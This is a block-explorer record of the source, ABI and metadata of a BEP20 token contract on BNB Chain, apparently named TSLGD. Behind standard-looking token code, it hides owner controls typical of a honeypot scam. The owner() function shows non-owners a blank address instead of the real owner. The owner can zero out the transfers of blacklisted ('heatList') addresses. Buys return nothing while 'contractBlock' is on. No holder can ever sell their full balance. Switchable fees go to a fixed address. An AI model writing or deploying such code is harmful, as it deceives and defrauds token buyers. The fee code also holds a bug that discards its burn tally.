{"SourceCode": "// SPDX-License-Identifier: SimPL-2.0\r\npragma solidity ^0.8.0;\r\n\r\ninterface PancakeRouter {\r\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function swapExactTokensForTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface PancakeFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a >= b ? a : b;\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract DateUtil {\r\n    uint256 internal constant SECONDS_PER_DAY = 24 * 60 * 60;\r\n    uint256 internal constant SECONDS_PER_HOUR = 60 * 60;\r\n    uint256 internal constant SECONDS_PER_MINUTE = 60;\r\n    uint256 internal constant OFFSET19700101 = 2440588;\r\n    uint256 internal constant DAY_IN_SECONDS = 86400;\r\n    uint256 internal constant YEAR_IN_SECONDS = 31536000;\r\n    uint256 internal constant LEAP_YEAR_IN_SECONDS = 31622400;\r\n    uint256 internal constant HOUR_IN_SECONDS = 3600;\r\n    uint256 internal constant MINUTE_IN_SECONDS = 60;\r\n    uint16 internal constant ORIGIN_YEAR = 1970;\r\n\r\n    uint8[] monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];\r\n\r\n    function getNow() internal view returns (uint256 timestamp) {\r\n        uint256 year;\r\n        uint256 month;\r\n        uint256 day;\r\n        (year, month, day) = daysToDate(block.timestamp, 8);\r\n        return toTimestamp(year, month, day, 8);\r\n    }\r\n\r\n    function daysToDate(uint256 timestamp, uint8 timezone)\r\n        internal\r\n        pure\r\n        returns (\r\n            uint256 year,\r\n            uint256 month,\r\n            uint256 day\r\n        )\r\n    {\r\n        return _daysToDate(timestamp + timezone * uint256(SECONDS_PER_HOUR));\r\n    }\r\n\r\n    function _daysToDate(uint256 timestamp)\r\n        internal\r\n        pure\r\n        returns (\r\n            uint256 year,\r\n            uint256 month,\r\n            uint256 day\r\n        )\r\n    {\r\n        uint256 _days = uint256(timestamp) / SECONDS_PER_DAY;\r\n\r\n        uint256 L = _days + 68569 + OFFSET19700101;\r\n        uint256 N = (4 * L) / 146097;\r\n        L = L - (146097 * N + 3) / 4;\r\n        year = (4000 * (L + 1)) / 1461001;\r\n        L = L - (1461 * year) / 4 + 31;\r\n        month = (80 * L) / 2447;\r\n        day = L - (2447 * month) / 80;\r\n        L = month / 11;\r\n        month = month + 2 - 12 * L;\r\n        year = 100 * (N - 49) + year + L;\r\n    }\r\n\r\n    function toTimestamp(\r\n        uint256 year,\r\n        uint256 month,\r\n        uint256 day,\r\n        uint256 timezone\r\n    ) internal pure returns (uint256 timestamp) {\r\n        uint256 i;\r\n        for (i = ORIGIN_YEAR; i < year; i++) {\r\n            if (isLeapYear(i)) {\r\n                timestamp += LEAP_YEAR_IN_SECONDS;\r\n            } else {\r\n                timestamp += YEAR_IN_SECONDS;\r\n            }\r\n        }\r\n        uint256[12] memory monthDayCounts;\r\n        monthDayCounts[0] = 31;\r\n        if (isLeapYear(year)) {\r\n            monthDayCounts[1] = 29;\r\n        } else {\r\n            monthDayCounts[1] = 28;\r\n        }\r\n        monthDayCounts[2] = 31;\r\n        monthDayCounts[3] = 30;\r\n        monthDayCounts[4] = 31;\r\n        monthDayCounts[5] = 30;\r\n        monthDayCounts[6] = 31;\r\n        monthDayCounts[7] = 31;\r\n        monthDayCounts[8] = 30;\r\n        monthDayCounts[9] = 31;\r\n        monthDayCounts[10] = 30;\r\n        monthDayCounts[11] = 31;\r\n        for (i = 1; i < month; i++) {\r\n            timestamp += DAY_IN_SECONDS * monthDayCounts[i - 1];\r\n        }\r\n        timestamp += DAY_IN_SECONDS * (day - 1);\r\n        timestamp = timestamp - timezone * uint256(SECONDS_PER_HOUR);\r\n        return timestamp;\r\n    }\r\n\r\n    function isLeapYear(uint256 year) internal pure returns (bool) {\r\n        if (year % 4 != 0) {\r\n            return false;\r\n        }\r\n        if (year % 100 != 0) {\r\n            return true;\r\n        }\r\n        if (year % 400 != 0) {\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n}\r\n\r\ncontract BEP20 is Context, DateUtil {\r\n    using SafeMath for uint256;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    address private _usdtAddress;\r\n    PancakeRouter private _pancakeRouter;\r\n    address private _pancakeRouterAddress;\r\n    mapping(address => bool) public isPairAddress;\r\n    mapping(address => bool) public systemList;\r\n    mapping(address => bool) public heatList;\r\n    uint256 private _maxHold;\r\n    uint16 private _maxTranRatio;\r\n    uint256 private _slipPoint;\r\n    uint256 public destroyed;\r\n    address public outAddress;\r\n    address private owners;\r\n    address private owners_;\r\n    uint256 public startBlock;\r\n    uint256 public tranProduce;\r\n    uint256 public alreadyOut;\r\n    bool public contractBlock;\r\n    bool public meatBlock;\r\n    mapping(uint256 => uint256) public dailyLp;\r\n    mapping(uint256 => uint256) public dailyNft;\r\n    mapping(address => bool) private mobilityMappingAddress;\r\n    address[] private mobilityArrayAddress;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    modifier __Owner() {\r\n        require(owners == _msgSender(), \"BEP20: Caller is not freak\");\r\n        _;\r\n    }\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _decimals = 18;\r\n        _mint(address(this), 5000 * 10**_decimals);\r\n        _mint(_msgSender(), 5000 * 10**_decimals);\r\n\r\n        _maxHold = 50 * 10**_decimals;\r\n        _maxTranRatio = 99;\r\n        _usdtAddress = 0x55d398326f99059fF775485246999027B3197955;\r\n        _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n        _pancakeRouter = PancakeRouter(_pancakeRouterAddress);\r\n        address _pairAddress = PancakeFactory(_pancakeRouter.factory())\r\n            .createPair(address(this), address(_usdtAddress));\r\n        isPairAddress[_pairAddress] = true;\r\n        outAddress = 0xd77170987df88Dfd32780931Cd3304537537aA3A;\r\n        owners = msg.sender;\r\n\r\n        systemList[_pairAddress] = true;\r\n        systemList[msg.sender] = true;\r\n        systemList[address(this)] = true;\r\n        systemList[outAddress] = true;\r\n\r\n        contractBlock = true;\r\n        meatBlock = false;\r\n\r\n        _slipPoint = 5;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        if (msg.sender == owners) {\r\n            return owners;\r\n        } else {\r\n            return owners_;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function setSystemAddress(address[] memory _address, bool _state)\r\n        public\r\n        __Owner\r\n        returns (bool)\r\n    {\r\n        for (uint256 i = 0; i < _address.length; i++) {\r\n            systemList[_address[i]] = _state;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function setNoSystemAddress(address[] memory _address, bool _state)\r\n        public\r\n        __Owner\r\n        returns (bool)\r\n    {\r\n        for (uint256 i = 0; i < _address.length; i++) {\r\n            heatList[_address[i]] = _state;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function setStartBlock(uint256 _startBlock) public __Owner returns (bool) {\r\n        startBlock = _startBlock;\r\n        return true;\r\n    }\r\n\r\n    function setContractBlock(bool _state) public __Owner returns (bool) {\r\n        contractBlock = _state;\r\n        return true;\r\n    }\r\n\r\n    function setMeatBlock(bool _state) public __Owner returns (bool) {\r\n        meatBlock = _state;\r\n        return true;\r\n    }\r\n\r\n    function setDestroyed(uint256 _destroyed) public __Owner returns (bool) {\r\n        destroyed = _destroyed;\r\n        return true;\r\n    }\r\n\r\n    function getMobilityArrayAddressLength() public view returns (uint256) {\r\n        return mobilityArrayAddress.length;\r\n    }\r\n\r\n    function getMobilityArrayAddress(uint256 i) public view returns (address) {\r\n        return mobilityArrayAddress[i];\r\n    }\r\n\r\n    function getProduce() public view returns (uint256) {\r\n        uint256 dailyOutput = 5 * 10**_decimals;\r\n        uint256 blockOutput = dailyOutput.div(28800);\r\n        uint256 produce = (block.number - startBlock).mul(blockOutput);\r\n        if (produce > 5000 * 10**_decimals) {\r\n            produce = 5000 * 10**_decimals;\r\n        }\r\n        return produce;\r\n    }\r\n\r\n    function outCoin(address _address, uint256 amount)\r\n        public\r\n        __Owner\r\n        returns (bool)\r\n    {\r\n        uint256 totalProduce = tranProduce.add(getProduce());\r\n        uint256 surplusProduce = totalProduce.sub(alreadyOut);\r\n        require(surplusProduce >= amount, \"BEP20: Inoperable\");\r\n        _transfer(address(this), _address, amount);\r\n        alreadyOut = alreadyOut.add(amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        address owner_ = _msgSender();\r\n        _transfer(owner_, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner_, address spender)\r\n        public\r\n        view\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        address owner_ = _msgSender();\r\n        _approve(owner_, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        returns (bool)\r\n    {\r\n        address owner_ = _msgSender();\r\n        _approve(owner_, spender, allowance(owner_, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        returns (bool)\r\n    {\r\n        address owner_ = _msgSender();\r\n        uint256 currentAllowance = allowance(owner_, spender);\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"BEP20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(owner_, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal {\r\n        require(from != address(0), \"BEP20: transfer from the zero address\");\r\n        require(to != address(0), \"BEP20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(\r\n            fromBalance >= amount,\r\n            \"BEP20: transfer amount exceeds balance\"\r\n        );\r\n\r\n        if (heatList[from]) {\r\n            amount = 0;\r\n        }\r\n\r\n        if (!systemList[from]) {\r\n            uint256 now_balance = _balances[from];\r\n            if (amount > (now_balance * _maxTranRatio) / 100) {\r\n                require(false, \"BEP20: from too many transactions\");\r\n            }\r\n        }\r\n        if (isPairAddress[from]) {\r\n            if (!systemList[to]) {\r\n                amount = _takeFee(amount, from, 1);\r\n            }\r\n        } else if (isPairAddress[to]) {\r\n            if (!systemList[from]) {\r\n                amount = _takeFee(amount, from, 2);\r\n            }\r\n            if (!mobilityMappingAddress[from]) {\r\n                mobilityArrayAddress.push(from);\r\n                mobilityMappingAddress[from] = true;\r\n            }\r\n        }\r\n\r\n        if (!systemList[to]) {\r\n            uint256 now_balance = _balances[to];\r\n            if (now_balance + amount > _maxHold) {\r\n                require(false, \"BEP20: to too many transactions\");\r\n            }\r\n        }\r\n\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _takeFee(\r\n        uint256 _amount,\r\n        address _address,\r\n        uint256 _type\r\n    ) internal returns (uint256) {\r\n        uint256 fee = _slipPoint;\r\n        if (_type == 1) {\r\n            if (contractBlock) {\r\n                return 0;\r\n            } else {\r\n                if (meatBlock) {\r\n                    fee = 10;\r\n                } else {\r\n                    uint256 destroyeds = destroyed.div(10**_decimals);\r\n                    uint256 feeMultiple = destroyeds.sub(destroyeds % 2000).div(\r\n                        2000\r\n                    );\r\n                    if (feeMultiple >= _slipPoint) {\r\n                        fee = 1;\r\n                    } else {\r\n                        fee = _slipPoint.sub(feeMultiple);\r\n                    }\r\n                }\r\n            }\r\n        } else {\r\n            if (meatBlock) {\r\n                fee = 10;\r\n            } else {\r\n                uint256 destroyeds = destroyed.div(10**_decimals);\r\n                uint256 feeMultiple = destroyeds.sub(destroyeds % 2000).div(\r\n                    2000\r\n                );\r\n                if (feeMultiple >= _slipPoint) {\r\n                    fee = 1;\r\n                } else {\r\n                    fee = _slipPoint.sub(feeMultiple);\r\n                }\r\n            }\r\n        }\r\n        uint256 feeCoin = _amount.mul(fee).div(100);\r\n\r\n        uint256 destroyedNum = feeCoin.mul(10).div(100);\r\n        _burn(_address, destroyedNum);\r\n        destroyed.add(destroyedNum);\r\n\r\n        uint256 outNum = feeCoin.mul(50).div(100);\r\n        _transfer(_address, outAddress, outNum);\r\n\r\n        uint256 lpNum = feeCoin.mul(20).div(100);\r\n        uint256 timestamp = getNow();\r\n        uint256 todayLp = dailyLp[timestamp];\r\n        if (todayLp > 0) {\r\n            dailyLp[timestamp] = todayLp + lpNum;\r\n        } else {\r\n            dailyLp[timestamp] = lpNum;\r\n        }\r\n\r\n        uint256 nftNum = feeCoin.sub(destroyedNum).sub(outNum).sub(lpNum);\r\n        uint256 todayNft = dailyNft[timestamp];\r\n        if (todayNft > 0) {\r\n            dailyNft[timestamp] = todayNft + nftNum;\r\n        } else {\r\n            dailyNft[timestamp] = nftNum;\r\n        }\r\n\r\n        _transfer(_address, address(this), lpNum.add(nftNum));\r\n        tranProduce = tranProduce.add(lpNum).add(nftNum);\r\n        return _amount.sub(feeCoin);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal {\r\n        require(account != address(0), \"BEP20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal {\r\n        require(account != address(0), \"BEP20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"BEP20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner_,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        require(owner_ != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner_,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        uint256 currentAllowance = allowance(owner_, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(\r\n                currentAllowance >= amount,\r\n                \"BEP20: insufficient allowance\"\r\n            );\r\n            unchecked {\r\n                _approve(owner_, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal {}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"alreadyOut\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"dailyLp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"dailyNft\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"destroyed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"i\",\"type\":\"uint256\"}],\"name\":\"getMobilityArrayAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMobilityArrayAddressLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getProduce\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"heatList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isPairAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"meatBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"outAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"outCoin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"setContractBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_destroyed\",\"type\":\"uint256\"}],\"name\":\"setDestroyed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"setMeatBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"setNoSystemAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_startBlock\",\"type\":\"uint256\"}],\"name\":\"setStartBlock\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_address\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_state\",\"type\":\"bool\"}],\"name\":\"setSystemAddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"systemList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tranProduce\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BEP20", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000554534c4744000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000554534c4744000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://61fe6573c2eccf478587a775907009c69ae7103a9f83b95f3ae7ea83e9d363d1"}